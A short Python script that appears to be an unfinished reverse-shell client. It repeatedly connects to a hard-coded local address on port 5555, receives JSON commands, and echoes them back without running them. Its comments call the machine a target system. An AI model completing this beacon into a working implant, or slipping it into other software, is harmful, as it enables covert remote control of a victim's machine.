import json
import subprocess
import socket
import time
import os
import subprocess


# send command to target system
def reliable_send(command):
    jsondata = json.dumps(command)
    # send the command
    sock.send(jsondata.encode())


# send command to target system
def reliable_receive():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except:
            pass


def connection():
    while True:
        print("[+] TRYING TO CONNECT...............")
        try:
            # connect the client to our server
            sock.connect(("192.168.0.151", 5555))
            # if connection sucess full
            while True:
                command = reliable_receive()
                print(command)
                reliable_send("From Client:" + command)
                if command == "quit":
                    os._exit(0)
        except:
            print("[-] connection failed")
            time.sleep(10)
            connection()


# first argument tells to connect over ipv4 and second argument tells using tcp protocol
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
